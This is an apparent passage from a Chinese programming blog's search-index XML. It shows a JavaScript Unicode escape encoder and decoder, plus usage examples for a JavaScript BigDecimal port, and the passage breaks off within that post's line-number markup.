      
        <categories>
            
            <category> html-css </category>
            
        </categories>
        
        
        <tags>
            
            <tag> css </tag>
            
            <tag> overflow </tag>
            
            <tag> hidden </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[js unicode编码与解码]]></title>
      <url>/2015/js-unicode-hex/</url>
      <content type="html"><![CDATA[<p>javascript unicode 编码与解码实现</p>
<a id="more"></a>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> decToHex = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> res=[];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt; str.length;i++)</span><br><span class="line">        res[i]=(<span class="string">"00"</span>+str.charCodeAt(i).toString(<span class="number">16</span>)).slice(<span class="number">-4</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"\\u"</span>+res.join(<span class="string">"\\u"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> hexToDec = <span class="function"><span class="keyword">function</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    str=str.replace(<span class="regexp">/\\/g</span>,<span class="string">"%"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">unescape</span>(str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> str=decToHex(<span class="string">"\r\n"</span>);</span><br><span class="line">alert(<span class="string">"编码后："</span>+str+<span class="string">"\n\n解码后："</span>+hexToDec(str));</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> javascript </category>
            
        </categories>
        
        
        <tags>
            
            <tag> javascript </tag>
            
            <tag> 编码 </tag>
            
            <tag> 解码 </tag>
            
            <tag> unicode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[js Bigdecimal]]></title>
      <url>/2015/js-bigdecimal/</url>
      <content type="html"><![CDATA[<p>本文讲解如何在javascript中进行高精度的数学计算</p>
<p>学过java的同学应该都知道，java中有一个BigDecimal 是专门用来算金额的，今天这里的BigDecimal是从java翻译成js的。</p>
<a id="more"></a>
<p>先看用法：</p>
<p>加法(四舍五入保留两位小数)：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> BigDecimal(<span class="string">"2.555555"</span>).add(<span class="keyword">new</span> BigDecimal(<span class="string">"5.222222"</span>)).setScale(<span class="number">2</span>, MathContext.ROUND_HALF_UP).toString();  </span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br></pre></td></tr></table></figure>
<p>减法： </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> BigDecimal(<span class="string">"2.40"</span>).subtract(<span class="keyword">new</span> BigDecimal(<span class="string">"2"</span>))</span><br></pre></td></tr></table></figure>
<p>乘法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> BigDecimal(<span class="string">"2.40"</span>).multiply(<span class="keyword">new</span> BigDecimal(<span class="string">"2"</span>))</span><br></pre></td></tr></table></figure>
<p>除法：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> BigDecimal(<span class="string">"2.40"</span>).divide(<span class="keyword">new</span> BigDecimal(<span class="string">"2"</span>), def)</span><br></pre></td></tr></table></figure>
<p>下面来看看源代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br><span class="line">777</span><br><span class="line">778</span><br><span class="line">779</span><br><span class="line">780</span><br><span class="line">781</span><br><span class="line">782</span><br><span class="line">783</span><br><span class="line">784</span><br><span class="line">785</span><br><span class="line">786</span><br><span class="line">787</span><br><span class="line">788</span><br><span class="line">789</span><br><span class="line">790</span><br><span class="line">791</span><br><span class="line">792</span><br><span class="line">793</span><br><span class="line">794</span><br><span class="line">795</span><br><span class="line">796</span><br><span class="line">797</span><br><span class="line">798</span><br><span class="line">799</span><br><span class="line">800</span><br><span class="line">801</span><br><span class="line">802</span><br><span class="line">803</span><br><span class="line">804</span><br><span class="line">805</span><br><span class="line">806</span><br><span class="line">807</span><br><span class="line">808</span><br><span class="line">809</span><br><span class="line">810</span><br><span class="line">811</span><br><span class="line">812</span><br><span class="line">813</span><br><span class="line">814</span><br><span class="line">815</span><br><span class="line">816</span><br><span class="line">817</span><br><span class="line">818</span><br><span class="line">819</span><br><span class="line">820</span><br><span class="line">821</span><br><span class="line">822</span><br><span class="line">823</span><br><span class="line">824</span><br><span class="line">825</span><br><span class="line">826</span><br><span class="line">827</span><br><span class="line">828</span><br><span class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span 